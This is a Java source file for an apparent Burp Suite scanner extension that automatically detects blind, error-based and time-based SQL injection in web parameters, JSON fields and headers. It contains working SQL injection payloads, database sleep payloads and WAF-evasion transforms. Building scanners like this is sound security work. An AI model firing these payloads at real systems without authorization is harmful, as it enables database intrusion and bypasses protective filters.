package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.scan.sast.SourceFindings;
import com.ioactive.aiscanner.scan.sast.StaticHint;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.function.Function;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Deterministic <em>blind</em> SQL-injection oracle — generic (the existing error-based check misses
 * blind). Two inference channels, both differential and target-agnostic:
 * <ul>
 *   <li><b>Boolean</b>: append an always-true vs always-false condition to a value; a vulnerable query
 *       makes the TRUE response track the baseline while the FALSE response diverges (fewer/no rows).
 *       Confirmed only when two DIFFERENT true literals agree AND differ from false — so an endpoint that
 *       merely echoes the payload (different digits → different response) can't false-positive.</li>
 *   <li><b>Time</b>: append a DB sleep (MySQL/Postgres/MSSQL variants); confirmed when the response is
 *       delayed past a threshold beyond the measured baseline.</li>
 * </ul>
 * Injects into URL/BODY params AND JSON body string fields (Montoya's param model doesn't expose JSON
 * fields, so a JSON API's insertion points are otherwise skipped — the same gap that hid NoSQL). No
 * app-specific payloads or paths — the SQL is generic and the decision is a response differential.
 */
public final class BlindSqliProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;
    // Shared adaptive throttle (set once before a parallel run; null = no throttling). Thread-safe; every send
    // feeds its response status so a 429 from ANY worker shrinks the whole pool. Volatile: published before the
    // worker threads start.
    private volatile Throttle throttle;
    public BlindSqliProbe withThrottle(Throttle t) { this.throttle = t; return this; }

    // {trueA, false, trueB} triples across quoting contexts. trueA and trueB are BOTH logically true
    // but use DIFFERENT literals — a real boolean SQLi makes them agree (and differ from false), while
    // mere reflection of the payload makes them differ (different digits), which kills the classic
    // false positive on endpoints that just echo the input (e.g. command-injection reflectors).
    private static final String[][] BOOL = {
            {"' OR '1'='1", "' OR '1'='2", "' OR '8'='8"},
            {"' AND '1'='1", "' AND '1'='2", "' AND '8'='8"},
            {"\" OR \"1\"=\"1", "\" OR \"1\"=\"2", "\" OR \"8\"=\"8"},
            {" OR 1=1", " OR 1=2", " OR 8=8"},
            {" AND 1=1", " AND 1=2", " AND 8=8"},
            {"') OR ('1'='1", "') OR ('1'='2", "') OR ('8'='8"},
    };
    // Time-delay payloads across engines; appended to the value.
    // Sleep duration is configurable: -Daiscanner.sqliSleepSec=N (or AISCANNER_SQLI_SLEEP_SEC). Default 5s.
    // Increase for high-latency targets where 5s is noise; decrease for fast inner loops.
    private static final int SLEEP_SEC;
    private static final String[] TIME;
    private static final long TIME_THRESHOLD_MS;
    static {
        int s = 5;
        try {
            String v = System.getProperty("aiscanner.sqliSleepSec");
            if (v == null || v.isBlank()) v = System.getenv("AISCANNER_SQLI_SLEEP_SEC");
            if (v != null && !v.isBlank()) s = Math.max(1, Math.min(60, Integer.parseInt(v.trim())));
        } catch (Throwable ignore) { }
        SLEEP_SEC = s;
        String mm = String.format("0:0:%d", s);
        TIME = new String[]{
            "' AND SLEEP(" + s + ")-- -",
            " AND SLEEP(" + s + ")-- -",
            "' AND SLEEP(" + s + ") AND '1'='1",
            "';SELECT pg_sleep(" + s + ")-- -",
            "' AND pg_sleep(" + s + ")-- -",
            "';WAITFOR DELAY '" + mm + "'-- -",
        };
        TIME_THRESHOLD_MS = (long)(s * 1000 * 0.8);   // 80% of sleep = confirmed delay
    }
    private static final Pattern SKIP = Pattern.compile(
            "(?i).*/(socket\\.io|engine\\.io)(\\b.*)?$|.*\\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|mp4|webp|pdf)(\\?.*)?$");
    // A JSON "key":"value" string field (value may contain escaped chars).
    private static final Pattern JSON_STR = Pattern.compile("\"([^\"]+)\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"");

    private SourceFindings sourceHints;   // optional SAST directives — used only to tag finding provenance

    public BlindSqliProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    public void setSourceHints(SourceFindings hints) { this.sourceHints = hints; }

    // ---- SYSTEMIC DEDUP (mirrors CsrfProbe.emitCsrf) ------------------------------------------------------------
    // A single injectable sink reached via MANY inputs floods the report. WebGoat is the extreme case: its shared
    // request/attempt-logging INSERT is SQL-injectable, so a quote in ANY param OR header on ANY endpoint throws
    // org.hibernate — quote-parity confirms each as a REAL SQLi, but they are ~1 systemic flaw, not N. So we COLLECT
    // hits (thread-safe; probe() runs in parallel) and, past a cap, emit ONE systemic finding instead of N clones —
    // exactly how CSRF collapses. Below the cap (a genuine handful on a normal app) each is emitted individually.
    private static final int SQLI_CAP = 5;
    private final java.util.Map<String, String[]> sqliHits = new java.util.concurrent.ConcurrentHashMap<>(); // url → {class, detail}
    private final java.util.Map<String, HttpRequestResponse> sqliEv = new java.util.concurrent.ConcurrentHashMap<>();

    /** Collect a confirmed SQLi (dedup per endpoint URL) instead of emitting inline — {@link #emitCollapsed} decides. */
    private void recordSqli(String cls, String url, String detail, HttpRequestResponse ev) {
        sqliHits.putIfAbsent(url, new String[]{cls, detail});
        if (ev != null) sqliEv.putIfAbsent(url, ev);
    }

    /** Emit the collected SQLi: one systemic finding above the cap, else each individually. Call ONCE after the
     *  probe loop. Returns the raw hit count (for the caller's "N endpoint(s) injectable" line). */
    public int emitCollapsed() {
        int n = sqliHits.size();
        if (n == 0) return 0;
        if (n <= SQLI_CAP) {
            for (java.util.Map.Entry<String, String[]> e : sqliHits.entrySet()) {
                scanLog.found(e.getValue()[0], e.getKey(), e.getValue()[1], evOf(e.getKey()));
                scanLog.incFinding();
            }
        } else {
            java.util.List<String> keys = new java.util.ArrayList<>(sqliHits.keySet());
            String examples = String.join(", ", keys.subList(0, Math.min(5, keys.size())));
            String root = keys.get(0).replaceAll("(?i)^(https?://[^/]+).*", "$1") + "/";
            scanLog.found("SQL injection — shared injectable sink (systemic)", root,
                    n + " inputs (params AND headers, across unrelated endpoints) reach the SAME unescaped SQL sink — "
                    + "each confirmed by quote-parity (a single quote throws a DB error; the balanced quote does not). "
                    + "This is ONE systemic SQL injection in a shared layer (e.g. request/attempt logging), reported as "
                    + "one, not " + n + " (CWE-89). Examples: " + examples + " …", evOf(keys.get(0)));
            scanLog.incFinding();
        }
        sqliHits.clear(); sqliEv.clear();
        return n;
    }

    private HttpRequestResponse[] evOf(String url) {
        HttpRequestResponse e = sqliEv.get(url);
        return e == null ? new HttpRequestResponse[0] : new HttpRequestResponse[]{e};
    }

    /** Source provenance suffix when a matching SQLi sink exists (else empty). Never affects detection. */
    private String prov(String url) {
        if (sourceHints == null) return "";
        for (StaticHint h : sourceHints.all())
            if ("SQL Injection".equalsIgnoreCase(h.vulnClass) && (!h.hasEndpoint() || h.matchesUrl(url)))
                return "  " + h.provenance();
        return "";
    }

    public boolean probe(HttpRequest req) { return probe(req, Long.MAX_VALUE); }

    /** As {@link #probe(HttpRequest)} but honours the phase wall-clock {@code deadlineMs} BETWEEN insertion
     *  points — so a single heavy target (a many-field POST like DVNA's /app/useredit, ×6 boolean triples ×
     *  6×5s time payloads ×reproduce, plus connections the app hangs) can't blow past the phase budget and
     *  stall the whole sequential chain. The per-request send timeout bounds one call; this bounds the target. */
    public boolean probe(HttpRequest req, long deadlineMs) {
        try {
            if (SKIP.matcher(req.url()).matches()) return false;
            long t0 = System.nanoTime();
            HttpRequestResponse base = send(req);
            long baseMs = (System.nanoTime() - t0) / 1_000_000;
            if (base == null || base.response() == null) return false;

            // 1) URL/BODY params — inject via Montoya's parameter model.
            for (ParsedHttpParameter p : req.parameters()) {
                if (System.currentTimeMillis() > deadlineMs) return false;
                if (p.type() != HttpParameterType.URL && p.type() != HttpParameterType.BODY) continue;
                String orig = p.value() == null ? "" : p.value();
                if (runChannels(req, v -> inject(req, p, v),
                        p.name() + " (" + p.type() + ")", orig, seeds(orig), baseMs)) return true;
            }

            // 2) JSON body string fields — Montoya doesn't expose these as parameters, so inject into the
            //    raw body. This is what reaches JSON APIs (e.g. a coupon_code posted as {"coupon_code":…}).
            if (isJson(req)) {
                String body = req.bodyToString();
                Matcher m = JSON_STR.matcher(body);
                Set<String> keys = new LinkedHashSet<>();
                while (m.find()) keys.add(m.group(1));       // collect first so injection can't disturb iteration
                for (String key : keys) {
                    if (System.currentTimeMillis() > deadlineMs) return false;
                    String cur = currentJsonValue(body, key);
                    if (runChannels(req, v -> req.withBody(setJsonString(body, key, v)),
                            key + " (JSON)", cur, seeds(cur), baseMs)) return true;
                }
            }

            // 3) REQUEST HEADERS commonly logged/stored into a query (User-Agent/Referer/XFF access-log SQLi —
            //    sqli-labs Less-18/19/20). Fast channel only (error-string + parity), never blind boolean/time on
            //    headers. Cookie is skipped (replacing it would clobber the session). Generic standard header set.
            for (String h : HEADER_POINTS) {
                if (System.currentTimeMillis() > deadlineMs) return false;
                String cur = req.hasHeader(h) ? req.headerValue(h) : "Mozilla/5.0";
                if (fastSqli(req, v -> req.withHeader(h, v), h + " (header)", cur)) return true;
            }

            // 4) PARAM MINING for a parameterless GET page — the injectable param may be a documented text hint
            //    ("input the ID as parameter") with no <form>/link, so it never became an insertion point. Try a
            //    small GENERIC corpus of ubiquitous query-param names; the SQLi oracle IS the gate (a name that
            //    isn't a real param just echoes the baseline and never separates → zero-FP), so this is generic,
            //    not a rule hardcoded to any app. Fast channel only, bounded corpus.
            if ("GET".equalsIgnoreCase(req.method())
                    && req.parameters().stream().noneMatch(p -> p.type() == HttpParameterType.URL)) {
                for (String name : COMMON_PARAMS) {
                    if (System.currentTimeMillis() > deadlineMs) return false;
                    Function<String, HttpRequest> build =
                            v -> req.withAddedParameters(HttpParameter.parameter(name, v, HttpParameterType.URL));
                    if (fastSqli(req, build, name + " (mined URL param)", "1")) return true;   // error-based (cheap)
                    // blind boolean/time — only when the value actually drives the response (Less-8 boolean,
                    // Less-9/10 time), so the 5s time sleeps never run on a param name the page ignores.
                    if (paramInfluences(build)
                            && blindChannels(req, build, name + " (mined URL param)", "1",
                                    java.util.Collections.singleton("1"), baseMs)) return true;
                }
            }
        } catch (Throwable t) {
            scanLog.debug("[AI Scanner] blind-sqli probe error: " + t);
        }
        return false;
    }

    // Standard request headers apps frequently write into a SQL query (access logging, "last seen UA", etc.).
    private static final String[] HEADER_POINTS = { "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Client-IP" };
    // Ubiquitous query-param names (generic wordlist, NOT app-specific) — tried only on parameterless GET pages.
    private static final String[] COMMON_PARAMS = {
            "id", "cat", "page", "item", "pid", "uid", "user", "name", "q", "search", "query",
            "view", "file", "order", "sort", "artist", "report_id", "cid", "tid", "num" };

    /** Seeds to try: the discovered value AND a generic likely-valid id "1". The AND channel needs a value
     *  that returns a row (a crawler placeholder like "test" often isn't); OR needs one that doesn't —
     *  trying both covers either query context. */
    private static Set<String> seeds(String orig) {
        Set<String> s = new LinkedHashSet<>();
        if (orig != null && !orig.isEmpty()) s.add(orig);
        s.add("1");
        return s;
    }

    /** Boolean triples to try: the plain set, plus WAF-evasion variants (inline SQL comments + alternating
     *  case) when evasion mode is on. The transforms are semantics-preserving (the parser ignores inline
     *  comments and is case-insensitive), so the true/false logic still holds — but the obfuscated form slips
     *  past signature WAFs that block the naive payload. A 4th element tags evasion variants for the label.
     *  A blocked payload can't false-positive: all three legs get the same 403, so the triple never separates. */
    private static List<String[]> boolTriples() {
        List<String[]> out = new ArrayList<>();
        for (String[] t : BOOL) out.add(new String[]{ t[0], t[1], t[2], "" });
        if (Evasion.enabled()) {
            for (String[] t : BOOL) {
                out.add(new String[]{ inlineComment(t[0]), inlineComment(t[1]), inlineComment(t[2]), " [WAF-evasion inline-comment]" });
                out.add(new String[]{ Evasion.caseFlip(t[0]), Evasion.caseFlip(t[1]), Evasion.caseFlip(t[2]), " [WAF-evasion case]" });
            }
        }
        return out;
    }
    private static String inlineComment(String s) {
        return s.replaceAll("\\s+", Matcher.quoteReplacement("/" + "**" + "/"));
    }

    /** Boolean + time channels for one injection point, abstracted over how a value is placed into the
     *  request ({@code build}) so params and JSON fields share the exact same oracle. */
    private boolean runChannels(HttpRequest req, Function<String, HttpRequest> build,
                                String label, String orig, Set<String> seeds, long baseMs) {
        // --- fast deterministic channel (error-string + quote-parity), runs first (cheap) ---
        for (String seed : seeds) if (fastSqli(req, build, label, seed)) return true;
        return blindChannels(req, build, label, orig, seeds, baseMs);
    }

    /** Blind channels only (boolean + time). Split out so param mining can run the cheap error/parity on the
     *  whole corpus but reserve these — especially the 5s time sleeps — for params it first confirmed actually
     *  influence the response (never burn time payloads on junk param names). */
    private boolean blindChannels(HttpRequest req, Function<String, HttpRequest> build,
                                  String label, String orig, Set<String> seeds, long baseMs) {
        // --- boolean-based: two DIFFERENT true literals must agree with each other and differ from false,
        //     via the status channel (exists 200 / missing 404) or the normalized-body channel. Reflection
        //     makes the two trues differ → no FP. And a candidate MUST REPRODUCE on a second independent
        //     triple — intermittent non-determinism (flaky 4xx/5xx, reordered errors) won't repeat, a real
        //     boolean condition will.
        for (String seed : seeds) {
            for (String[] tf : boolTriples()) {
                int v = evalTriple(build, seed, tf);
                if (v != 0 && evalTriple(build, seed, tf) == v) {   // reproduce-gate
                    HttpRequestResponse ta = send(build.apply(seed + tf[0]));   // fresh evidence
                    recordSqli("SQL injection (blind)", pathOnly(req.url()),
                            "boolean-based " + label + " via " + (seed + tf[0]).trim()
                                    + (tf.length > 3 ? tf[3] : "") + prov(req.url()), ta);
                    return true;
                }
            }
        }
        // --- time-based ---
        String tUrl = req.url().split("\\?")[0];
        for (String payload : TIME) {
            HttpRequest tReq = build.apply(orig + payload);
            String tBody = tReq.body() != null && tReq.body().length() > 0
                    ? tReq.bodyToString().replace("\n"," ").replace("\r","") : "(no body)";
            if (tBody.length() > 200) tBody = tBody.substring(0, 200) + "…";
            long s0 = System.nanoTime();
            HttpRequestResponse tRr = send(tReq);
            long dt = (System.nanoTime() - s0) / 1_000_000;
            String tStatus = (tRr != null && tRr.response() != null) ? "HTTP " + tRr.response().statusCode() : "timeout";
            scanLog.debug("[AI Scanner] blind-sqli time-test @ " + tUrl + "  " + label
                    + " +" + dt + "ms (" + tStatus + ") payload=«" + (orig + payload).replace("\n"," ") + "» body=" + tBody);
            if (dt > baseMs + TIME_THRESHOLD_MS) {
                long c0 = System.nanoTime();                   // confirm it's the payload, not a fluke
                HttpRequestResponse tr = send(build.apply(orig + payload));   // capture the delayed response as evidence
                long dt2 = (System.nanoTime() - c0) / 1_000_000;
                scanLog.debug("[AI Scanner] blind-sqli time-test CONFIRM @ " + tUrl + "  " + label + " +" + dt2 + "ms");
                if (dt2 > baseMs + TIME_THRESHOLD_MS) {
                    recordSqli("SQL injection (blind)", pathOnly(req.url()), "time-based " + label + " +" + dt
                            + "ms (the injected sleep delayed the response — attached)" + prov(req.url()), tr);
                    return true;
                }
            }
        }
        return false;
    }

    /** Send true/false/true for one triple; return which channel separates them: 2=content, 1=status,
     *  0=none. rsig already includes the status, so the content channel subsumes status changes; the
     *  status-only channel is the fallback when bodies are identical but the status flips. */
    private int evalTriple(Function<String, HttpRequest> build, String seed, String[] tf) {
        HttpRequestResponse ta = send(build.apply(seed + tf[0]));   // true (literal A)
        HttpRequestResponse fa = send(build.apply(seed + tf[1]));   // false
        HttpRequestResponse tb = send(build.apply(seed + tf[2]));   // true (literal B)
        if (ta == null || fa == null || tb == null
                || ta.response() == null || fa.response() == null || tb.response() == null) return 0;
        String sa = rsig(ta, seed + tf[0]), sf = rsig(fa, seed + tf[1]), sb = rsig(tb, seed + tf[2]);
        if (sa.equals(sb) && !sa.equals(sf)) return 2;                       // content channel
        int sta = ta.response().statusCode(), stf = fa.response().statusCode(), stb = tb.response().statusCode();
        if (sta == stb && sta != stf) return 1;                             // status-only channel
        return 0;
    }

    // DB error signatures that appear ONLY after injection (mirrors VulnClasses.SQL_ERRORS; kept local so this
    // probe is self-contained). An error string present after a single quote and ABSENT from the baseline is a
    // deterministic, DB-explicit SQLi tell — the one sqli-labs-style apps emit (MySQL error in a 200 body).
    private static final String[] SQL_ERR = {
            "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
            "quoted string not properly terminated", "sqlstate", "ora-00", "ora-01", "pg::syntaxerror",
            "psqlexception", "syntax error at or near", "sqlite3::", "sqlite error", "microsoft ole db provider",
            "odbc sql server driver", "supplied argument is not a valid mysql", "mysql_fetch", "mysql_num_rows",
            "org.hibernate", "com.microsoft.sqlserver.jdbc" };

    private static String newSqlError(String baseBody, String mutBody) {
        if (mutBody == null) return null;
        String m = mutBody.toLowerCase(), b = baseBody == null ? "" : baseBody.toLowerCase();
        for (String s : SQL_ERR) if (m.contains(s) && !b.contains(s)) return s;
        return null;
    }

    /** Fast, deterministic, DB-agnostic SQLi channel — used for URL/BODY/JSON params AND for headers and mined
     *  params. Two tells, both reproduced to kill flakiness → zero-FP:
     *  (a) ERROR-STRING: a single quote surfaces a DB error string absent from the baseline body (the classic
     *      in-200-body MySQL/HSQLDB error, e.g. sqli-labs) — the status-parity check misses this since status
     *      stays 2xx; (b) QUOTE-PARITY: baseline 2xx → single quote 5xx → balanced quote 2xx (the DB threw and
     *      the error was swallowed into a generic 5xx). A tolerant param never breaks; a validation error 5xx-es
     *      on the balanced quote too → neither tell fires. */
    // SQL string/identifier break tokens across quoting contexts (single/double quote, and paren-wrapped
    // variants — sqli-labs Less-4 uses ("), Less-6 double-quote, etc.). Generic, DB-agnostic.
    private static final String[] BREAKS = { "'", "\"", "')", "\")", "'))", "\"))" };

    /** The BALANCED counterpart of a break token: double the leading quote to re-close the string literal, keeping
     *  any trailing paren(s). A real SQLi errors on the break but recovers on this; a generic DB-error page errors
     *  on both. ' → '' ; " → "" ; ') → '') ; ")→ "") ; ')) → '')) ; ")) → "")) */
    static String balancedBreak(String bk) {
        if (bk == null || bk.isEmpty()) return bk;
        char q = bk.charAt(0);
        return q + bk;   // prepend a matching quote → doubles the leader, trailing parens preserved
    }

    private boolean fastSqli(HttpRequest req, Function<String, HttpRequest> build, String label, String seed) {
        HttpRequestResponse b0 = send(build.apply(seed));
        if (b0 == null || b0.response() == null) return false;
        String bBody = b0.response().bodyToString();
        // (a) error-based (in-body DB error) — try each break token; a DB error surfacing that's absent from the
        //     baseline (and reproduces) is a deterministic SQLi tell regardless of the quoting context.
        for (String bk : BREAKS) {
            HttpRequestResponse q1 = send(build.apply(seed + bk));
            if (q1 == null || q1.response() == null) continue;
            String sig = newSqlError(bBody, q1.response().bodyToString());
            if (sig == null) continue;
            // QUOTE-PARITY GATE (zero-FP): a REAL error-based SQLi errors on the UNbalanced break but RECOVERS on the
            // BALANCED one (doubling the quote re-closes the string literal → valid query → no DB error). A generic
            // DB-error page — WebGoat emits `org.hibernate` on ANY malformed input at many NON-SQL endpoints
            // (xxe/*, SSRF/*, XSS, csrf/*) — errors on the balanced quote TOO, which massively inflated the count.
            // Require: balanced quote does NOT surface a DB error. Otherwise it's a generic error, not injectable.
            HttpRequestResponse qb = send(build.apply(seed + balancedBreak(bk)));
            if (qb == null || qb.response() == null
                    || newSqlError(bBody, qb.response().bodyToString()) != null) continue;   // balanced also errors → generic, skip
            HttpRequestResponse q2 = send(build.apply(seed + bk));   // reproduce the break
            if (q2 != null && q2.response() != null && newSqlError(bBody, q2.response().bodyToString()) != null) {
                recordSqli("SQL injection", pathOnly(req.url()),
                        "error-based " + label + ": the token " + bk + " surfaced the DB error \"" + sig
                                + "\" while the balanced token " + balancedBreak(bk) + " did NOT — the input reaches a "
                                + "SQL string unescaped (CWE-89)" + prov(req.url()), q2);
                return true;
            }
        }
        // (b) status-class quote-parity (error swallowed into a generic 5xx) ---
        HttpRequestResponse q1 = send(build.apply(seed + "'"));
        if (q1 == null || q1.response() == null) return false;
        HttpRequestResponse e2 = send(build.apply(seed + "''"));
        if (e2 != null && e2.response() != null) {
            int cb = klass(b0), co = klass(q1), ce = klass(e2);
            if (cb == 2 && co == 5 && ce == 2) {                       // break then recover
                HttpRequestResponse r = send(build.apply(seed + "'"));  // reproduce the break
                if (r != null && r.response() != null && klass(r) == 5) {
                    recordSqli("SQL injection", pathOnly(req.url()),
                            "quote-parity " + label + ": baseline and balanced-quote (" + seed + "'') behave alike "
                                    + "while a single quote (" + seed + "') breaks the query — an unescaped SQL "
                                    + "string literal (CWE-89, DB error swallowed into a generic response)"
                                    + prov(req.url()), r);
                    return true;
                }
            }
        }
        return false;
    }

    /** Coarse HTTP status class: 2 (2xx) … 5 (5xx). Buckets absorb minor per-request body noise. */
    private static int klass(HttpRequestResponse rr) { return rr.response().statusCode() / 100; }

    /** True when the value drives the response — two distinct values yield distinct (nonce-normalized) bodies,
     *  so the parameter actually reaches a DB lookup. Gates the expensive blind channels for mined params: a
     *  junk param name the page ignores returns the same body for both → skipped (no time sleeps wasted). */
    private boolean paramInfluences(Function<String, HttpRequest> build) {
        HttpRequestResponse a = send(build.apply("1"));
        HttpRequestResponse b = send(build.apply("9999999"));
        if (a == null || b == null || a.response() == null || b.response() == null) return false;
        return !rsig(a, "1").equals(rsig(b, "9999999"));
    }

    private static HttpRequest inject(HttpRequest req, ParsedHttpParameter p, String value) {
        return req.withUpdatedParameters(HttpParameter.parameter(p.name(), value, p.type()));
    }

    /** A SQL-injection finding's identity is (path, injected parameter) — the parameter is already in the
     *  detail line, so report against the path (no query). This collapses the same injectable param reached
     *  via different seed URLs (a single-param read and an all-params read of the SAME endpoint) into ONE
     *  finding instead of inflating the count with duplicates. The exact injected URL stays in the evidence. */
    private static String pathOnly(String url) {
        if (url == null) return "";
        int q = url.indexOf('?');
        return q < 0 ? url : url.substring(0, q);
    }

    /** Replace the FIRST {@code "key":"…"} string value in a JSON body with {@code val} (JSON-escaped). */
    private static String setJsonString(String body, String key, String val) {
        String replacement = "$1" + Matcher.quoteReplacement(jsonEscape(val)) + "$2";
        return body.replaceFirst(
                "(\"" + Pattern.quote(key) + "\"\\s*:\\s*\")(?:[^\"\\\\]|\\\\.)*(\")", replacement);
    }

    private static String currentJsonValue(String body, String key) {
        Matcher m = Pattern.compile(
                "\"" + Pattern.quote(key) + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"").matcher(body);
        return m.find() ? jsonUnescape(m.group(1)) : "";
    }

    private static String jsonEscape(String s) {
        return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static String jsonUnescape(String s) {
        return s == null ? "" : s.replace("\\\"", "\"").replace("\\\\", "\\");
    }

    /** Response signature = HTTP status + normalized body — captures a status flip and a content change. */
    private static String rsig(HttpRequestResponse rr, String injected) {
        if (rr == null || rr.response() == null) return "";
        return rr.response().statusCode() + ":" + sig(rr.response().bodyToString(), injected);
    }

    /** Normalize a body for boolean comparison: drop the (possibly reflected) injected value, strip
     *  32-hex CSRF tokens, collapse whitespace, AND sort the tokens. The token-sort is essential:
     *  many frameworks emit validation errors / JSON keys in a NON-DETERMINISTIC order (HashMap
     *  iteration), so two IDENTICAL requests come back word-reordered — which would fool the content
     *  channel into "true==true, differs from false" purely by chance (observed on crAPI's Spring
     *  identity endpoints). Sorting neutralizes reorder noise while a real result-set change (different
     *  tokens, more/fewer rows) still moves the signature. */
    private static String sig(String body, String injected) {
        if (body == null) return "";
        String s = body;
        if (injected != null && !injected.isEmpty()) {
            s = s.replace(injected, "");
            s = s.replace(htmlEsc(injected), "");   // reflected-but-HTML-encoded form
        }
        String norm = s.replaceAll("(?i)[a-f0-9]{32}", "").replaceAll("\\s+", " ").trim();
        String[] toks = norm.split(" ");
        java.util.Arrays.sort(toks);
        return String.join(" ", toks);
    }

    private static String htmlEsc(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&#039;");
    }

    private static boolean isJson(HttpRequest req) {
        try {
            String b = req.bodyToString();
            if (b == null || b.isBlank()) return false;
            String ct = req.hasHeader("Content-Type") ? req.headerValue("Content-Type") : "";
            if (ct != null && ct.toLowerCase().contains("json")) return true;
            String t = b.trim();   // fall back to body SHAPE — captured/replayed reqs can lose the header
            return (t.startsWith("{") && t.endsWith("}")) || (t.startsWith("[") && t.endsWith("]"));
        } catch (Throwable t) { return false; }
    }

    // Burp's own send can block FOREVER in Socket.read() when a target accepts the connection but never completes
    // the response (e.g. a crashed Node handler holding the socket) — RequestOptions.withResponseTimeout does NOT
    // interrupt that read (confirmed by thread dump). A HARD wall-clock cap via Future.get is the only reliable
    // bound: on timeout we abandon the (leaked, daemon) worker and move on, so one hung request can never stall
    // the whole sequential/parallel probe chain. Daemon pool → leaked workers never block JVM exit.
    private static final java.util.concurrent.ExecutorService SEND_POOL =
            java.util.concurrent.Executors.newCachedThreadPool(r -> {
                Thread t = new Thread(r, "aisc-blindsqli-send"); t.setDaemon(true); return t; });
    private static final long SEND_HARD_TIMEOUT_MS = 10_000L;   // > the 5s time-payloads; hung sockets cut fast
    private static final int  HANG_TRIP = 8;                    // total send-timeouts → declare the target hung, stop
    private final java.util.concurrent.atomic.AtomicInteger timeouts = new java.util.concurrent.atomic.AtomicInteger();
    private final java.util.concurrent.atomic.AtomicInteger sends = new java.util.concurrent.atomic.AtomicInteger();
    private volatile boolean targetHanging = false;
    public boolean targetHanging() { return targetHanging; }
    public int sendCount() { return sends.get(); }
    public int timeoutCount() { return timeouts.get(); }

    private static final long SLOW_SEND_MS = SLEEP_SEC * 1000L + 3_000L;   // sleep + 3s margin = stalling threshold

    private HttpRequestResponse send(HttpRequest req) {
        if (targetHanging) return null;   // circuit open: this target stalls responses → stop hammering it
        sends.incrementAndGet();
        long t0 = System.nanoTime();
        HttpRequestResponse rr = null;
        java.util.concurrent.Future<HttpRequestResponse> f = null;
        try {
            f = SEND_POOL.submit(() -> api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(9000L)));
            rr = f.get(SEND_HARD_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS);
        } catch (java.util.concurrent.TimeoutException te) {
            if (f != null) f.cancel(true);   // Burp's Socket.read may ignore interrupt (daemon worker leaks) — scan proceeds
        } catch (Throwable t) { /* fall through */ }
        long ms = (System.nanoTime() - t0) / 1_000_000L;
        // Count a send as BAD when it stalled us — whether it hard-timed-out (Future), Burp's own response-timeout
        // fired (returns null/error after ~9s), or it errored slowly. Counting only Future-timeouts missed the
        // common case (Burp's timedRead returns just under the hard cap → no TimeoutException) and the breaker
        // never tripped. Trip on total BAD sends so a target that stalls us degrades to "skip", not a silent grind.
        boolean bad = (rr == null || rr.response() == null || ms >= SLOW_SEND_MS);
        if (bad) {
            int n = timeouts.incrementAndGet();
            String bodySnip = req.body() != null && req.body().length() > 0
                    ? req.bodyToString().replace("\n", " ").replace("\r", "")
                    : "(no body)";
            if (bodySnip.length() > 300) bodySnip = bodySnip.substring(0, 300) + "…";
            String respSnip = (rr != null && rr.response() != null)
                    ? " → HTTP " + rr.response().statusCode() + " " + rr.response().bodyToString()
                            .replace("\n"," ").replace("\r","").substring(0, Math.min(200, rr.response().bodyToString().length()))
                    : " → (no response / timeout)";
            scanLog.debug("[AI Scanner] blind-sqli: slow/failed send (" + n + "/" + HANG_TRIP + ", " + ms + "ms) @ "
                    + req.url().split("\\?")[0] + "  " + req.method() + " body: " + bodySnip + respSnip);
            if (n >= HANG_TRIP && !targetHanging) {
                targetHanging = true;
                scanLog.log("[AI Scanner] blind-SQLi: target is stalling responses (" + n + " slow/failed of "
                        + sends.get() + " sends) → skipping remaining blind-SQLi (fragile/broken target, NOT a scanner stall).");
            }
            return rr;   // may be null; caller handles
        }
        Throttle t = throttle;
        if (t != null && rr.response() != null) t.observe(rr.response().statusCode());
        return rr;
    }
}
